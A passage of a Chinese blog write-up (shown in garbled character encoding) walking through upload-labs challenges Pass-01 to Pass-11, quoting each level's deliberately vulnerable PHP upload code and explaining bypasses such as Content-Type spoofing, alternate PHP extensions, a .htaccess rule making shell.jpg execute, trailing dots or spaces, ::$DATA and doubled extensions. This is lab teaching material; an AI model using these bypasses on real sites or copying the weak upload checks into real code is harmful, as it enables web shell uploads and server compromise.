class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç›´æ¥åœ¨jsä¸Šæ·»åŠ php æˆ–è€…burpæ”¹åŒ…å°±å¥½äº†</p>
<hr>
<h2 id="Pass-02-åªéªŒè¯Content-type"><a href="#Pass-02-åªéªŒè¯Content-type" class="headerlink" title="Pass-02 åªéªŒè¯Content-type"></a>Pass-02 åªéªŒè¯Content-type</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;ä¸Šä¼ å‡ºé”™ï¼&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH.&#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>æŠ“åŒ…æ”¹Content-Typeå³å¯ã€‚</p>
<hr>
<h2 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03 é»‘åå•ç»•è¿‡"></a>Pass-03 é»‘åå•ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;ä¸Šä¼ å‡ºé”™ï¼&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ä¸å…è®¸ä¸Šä¼  <code>.asp</code>, <code>.aspx</code>, <code>.php</code>, <code>.jsp</code>åç¼€æ–‡ä»¶ï¼Œä½†å¯ä»¥ä¸Šä¼ å…¶ä»–çš„åç¼€</p>
<blockquote>
<p> .phtml .phps .php5 .pht</p>
</blockquote>
<p>å‰ææ˜¯ <code>apache</code> çš„ <code>httpd.conf</code> ä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure></div>
<p>æˆ–è€…ä¸Šä¼  <code>.htaccess</code> æ–‡ä»¶<br>ä½†æ˜¯éœ€è¦ 1. <code>mod_rewrite</code> å¼€å¯ï¼›2. <code>AllowOverride All</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&gt;</span><br><span class="line">  SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>
<p>æ­¤æ—¶ä¸Šä¼ çš„ <code>shell.jpg</code> ä¼šè¢«è§£ææˆ <code>php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6d312j313w0hdn05.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6d312j313w0hdn05.jpg" class="lazyload" title="test"></a><br>æˆ–è€…ç›´æ¥æ·»åŠ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure></div>
<p>åŸºæœ¬ä¸Šæ‰€æœ‰çš„é»‘åå•éƒ½å¯ä»¥ç”¨Apacheè§£ææ¼æ´ç»•è¿‡ã€‚<br>(è¿™é“é¢˜æˆ‘å¡äº†ä¸€æ®µæ—¶é—´ï¼Œåæ¥æ”¹äº†phpé…ç½®ï¼Œæ”¹æˆ5.4.45ç‰ˆæœ¬å°±èƒ½è·‘ orz)</p>
<hr>
<h2 id="Pass-04-htaccessç»•è¿‡"><a href="#Pass-04-htaccessç»•è¿‡" class="headerlink" title="Pass-04 .htaccessç»•è¿‡"></a>Pass-04 .htaccessç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åŸºæœ¬ä¸Šè¿‡æ»¤äº†å„ç§åç¼€<br>ç…§æ¬ä¸Šé¢çš„æ–¹æ³•ç”¨ <code>.htaccess</code> åç¼€å¯ä»¥ç»•è¿‡ã€‚</p>
<hr>
<h2 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05 å¤§å°å†™ç»•è¿‡"></a>Pass-05 å¤§å°å†™ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gaysj31cs0s0794.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gaysj31cs0s0794.jpg" class="lazyload" title="test"></a></p>
<p>è™½ç„¶è¿‡æ»¤äº† <code>.htaccess</code> ï¼Œä½†æ˜¯ä»£ç ä¸­åç¼€è½¬æ¢ä¸ºå°å†™è¢«å»æ‰äº†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ <strong>Php</strong>æ¥ç»•è¿‡é»‘åå•åç¼€ã€‚(åœ¨Linuxæ²¡æœ‰ç‰¹æ®Šé…ç½®çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æƒ…å†µåªæœ‰Windowså¯ä»¥ï¼Œå› ä¸ºWindowsä¼šå¿½ç•¥å¤§å°å†™)<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6dcjbj31240doq5a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6dcjbj31240doq5a.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Pass-06-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06 ç©ºæ ¼ç»•è¿‡"></a>Pass-06 ç©ºæ ¼ç»•è¿‡</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6fyomj31go0m8adb.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6fyomj31go0m8adb.jpg" class="lazyload" title="test"></a><br>Windowsä¸‹ <code>xx.jpg[ç©ºæ ¼]</code> æˆ– <code>xx.jpg</code> ã€‚è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹<br>æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª <code>.phpç©ºæ ¼</code> æ–‡ä»¶å³å¯ã€‚</p>
<hr>
<h2 id="Pass-07-ç‚¹ç»•è¿‡"><a href="#Pass-07-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-07 ç‚¹ç»•è¿‡"></a>Pass-07 ç‚¹ç»•è¿‡</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gct1j31cq0m70w4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6gct1j31cq0m70w4.jpg" class="lazyload" title="test"></a><br>æ²¡æœ‰å»é™¤æœ«å°¾çš„ç‚¹ï¼Œå› æ­¤ä¸ä¸Šé¢åŒç†ï¼Œä¸Šä¼  <code>.php.</code> ç»•è¿‡ã€‚</p>
<hr>
<h2 id="Pass-08-DATA-ç»•è¿‡"><a href="#Pass-08-DATA-ç»•è¿‡" class="headerlink" title="Pass-08 ::$DATA ç»•è¿‡"></a>Pass-08 ::$DATA ç»•è¿‡</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6h9qmj31h90lftc1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6h9qmj31h90lftc1.jpg" class="lazyload" title="test"></a></p>
<blockquote>
<p>NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒã€‚è¿™ä¸æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åŠŸèƒ½ï¼Œä¸»è¦åŒ…æ‹¬æä¾›ä¸Macintoshæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶çš„å…¼å®¹æ€§ã€‚å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµã€‚æ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸ºï¼š<code>$ DATA</code>ã€‚</p>
</blockquote>
<p><strong>php</strong>åœ¨<strong>Windows</strong>çš„æ—¶å€™å¦‚æœæ–‡ä»¶å+ <code>::$DATA</code> ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ <code>::$DATA</code> ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å,ä¸Šä¼ <code>.php::$DATA</code>ç»•è¿‡ã€‚(ä»…é™Windows)</p>
<hr>
<h2 id="Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹-ç»•è¿‡"><a href="#Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹-ç»•è¿‡" class="headerlink" title="Pass-09 ç‚¹ + ç©ºæ ¼ + ç‚¹ ç»•è¿‡"></a>Pass-09 ç‚¹ + ç©ºæ ¼ + ç‚¹ ç»•è¿‡</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t8055ej31g50m3n0i.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t8055ej31g50m3n0i.jpg" class="lazyload" title="test"></a><br>move_upload_fileçš„æ–‡ä»¶åç›´æ¥ä¸ºç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åï¼Œé¢˜ç›®è¯´æ˜æ˜¯å¯æ§çš„ã€‚ä¸”ä¼šåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç»“åˆPass-7ç”¨<code>.php.ç©ºæ ¼.</code>ç»•è¿‡ã€‚</p>
<hr>
<h2 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10 åŒå†™ç»•è¿‡"></a>Pass-10 åŒå†™ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…³é”®è¯­å¥å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure></div>
<p>æ•æ„Ÿåç¼€æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ <code>.pphphp</code> ç»•è¿‡å³å¯ã€‚</p>
<hr>
<h2 id="Pass-11-00æˆªæ–­"><a href="#Pass-11-00æˆªæ–­" class="headerlink" title="Pass-11 00æˆªæ–­"></a>Pass-11 00æˆªæ–­</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
